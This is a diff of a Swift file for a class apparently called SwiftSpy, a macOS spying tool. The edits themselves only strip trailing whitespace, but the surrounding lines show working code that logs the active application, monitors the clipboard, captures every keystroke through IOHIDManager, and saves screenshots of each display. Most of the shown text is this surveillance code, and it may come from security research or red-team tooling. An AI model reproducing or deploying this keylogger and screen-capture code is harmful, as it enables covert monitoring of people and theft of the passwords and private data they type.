@@ -126,14 +126,14 @@ class SwiftSpy
         let notificationCenter = NSWorkspace.shared.notificationCenter
         notificationCenter.addObserver(forName: NSWorkspace.didActivateApplicationNotification, object: nil, queue: OperationQueue.main)
         {   (notificationCenter: Notification) in
-            
+
             let currentApp = notificationCenter.userInfo!["NSWorkspaceApplicationKey"] as! NSRunningApplication
             print("")
             print("[+] New Active App:", currentApp.localizedName!)
         }
         RunLoop.current.run()
     }
-    
+
     func ClipboardMonitor()
     {
         setbuf(__stdoutp, nil)
@@ -153,18 +153,18 @@ class SwiftSpy
             }
         }
     }
-        
+
     // https://stackoverflow.com/questions/7190852/using-iohidmanager-to-get-modifier-key-events
     // https://stackoverflow.com/questions/30380400/how-to-tap-hook-keyboard-events-in-osx-and-record-which-keyboard-fires-each-even
     var Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, value in
         let elem: IOHIDElement = IOHIDValueGetElement(value);
         let scancode = IOHIDElementGetUsage(elem);
-        
+
         if (IOHIDElementGetUsagePage(elem) != 0x07)
           {
               return
           }
-        
+
         // invalid keys
         if (scancode < 4 || scancode > 231)
         {
@@ -182,19 +182,19 @@ class SwiftSpy
                 print(keyMap[scancode]![0], terminator:"")
                 return
             }
-            
+
             // print shift up and return
             if (scancode == 225 || scancode == 229)
             {
                 print(keyMap[scancode]![0], terminator:"")
                 return
             }
-            
+
             // no capslock
             if (capslock == false)
             {
                 print(keyMap[scancode]![0], terminator:"")
-                
+
             }
             // capslock on
             else if (capslock == true)
@@ -215,7 +215,7 @@ class SwiftSpy
             print(keyMap[scancode]![1], terminator:"")
         }
     }
-    
+
     // https://stackoverflow.com/questions/8676135/osx-hid-filter-for-secondary-keyboard
     // https://developer.apple.com/library/archive/documentation/DeviceDrivers/Conceptual/HID/new_api_10_5/tn2187.html
     // https://stackoverflow.com/questions/48070396/how-to-get-list-of-hid-devices-in-a-swift-cocoa-application
@@ -232,7 +232,7 @@ class SwiftSpy
         {
             print("[+] HID manager created!")
         }
-        
+
         // Setup device filtering,
         func CreateDeviceMatchingDictionary( usagePage: Int, usage: Int) -> CFMutableDictionary {
             let dict = [
@@ -244,7 +244,7 @@ class SwiftSpy
         }
         let keyboard = CreateDeviceMatchingDictionary(usagePage: kHIDPage_GenericDesktop, usage: kHIDUsage_GD_Keyboard)
         IOHIDManagerSetDeviceMatching(HIDManager, keyboard)
-        
+
         // Enumerate keyboard devices
         let devices = IOHIDManagerCopyDevices(HIDManager)
         if (devices != nil) {
@@ -256,11 +256,11 @@ class SwiftSpy
             print("[-] Could not find any devices")
             exit(1);
         }
-        
+
         // Setup callback
         let context = UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
         IOHIDManagerRegisterInputValueCallback(HIDManager, Handle_IOHIDInputValueCallback, context);
-        
+
         // Open HID Manager
         let ioreturn: IOReturn = IOHIDManagerOpen(HIDManager, IOOptionBits(kIOHIDOptionsTypeNone) )
         if ioreturn != kIOReturnSuccess
@@ -272,12 +272,12 @@ class SwiftSpy
         {
             print("[+] HID manager opened!")
         }
-                
+
         // Start RunLoop
         IOHIDManagerScheduleWithRunLoop(HIDManager, CFRunLoopGetCurrent(), CFRunLoopMode.defaultMode.rawValue)
         RunLoop.current.run()
     }
-    
+
     // https://stackoverflow.com/questions/39691106/programmatically-screenshot-swift-3-macos/40864231#40864231
     func Screenshot(folderName: String)
     {
@@ -290,19 +290,19 @@ class SwiftSpy
          let allocated = Int(displayCount)
          let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
          result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
-         
+
          if (result != CGError.success) {
              print("Error: \(result)")
              return
          }
-            
+
          for i in 1...displayCount {
             let unixTimestamp = Date()
             let fileUrl = URL(fileURLWithPath: folderName + "\(unixTimestamp)" + "_" + "\(i)" + ".jpg", isDirectory: true)
             let screenShot:CGImage = CGDisplayCreateImage(activeDisplays[Int(i-1)])!
             let bitmapRep = NSBitmapImageRep(cgImage: screenShot)
             let jpegData = bitmapRep.representation(using: NSBitmapImageRep.FileType.jpeg, properties: [:])!
-             
+
             do {
                 try jpegData.write(to: fileUrl, options: .atomic)
             }
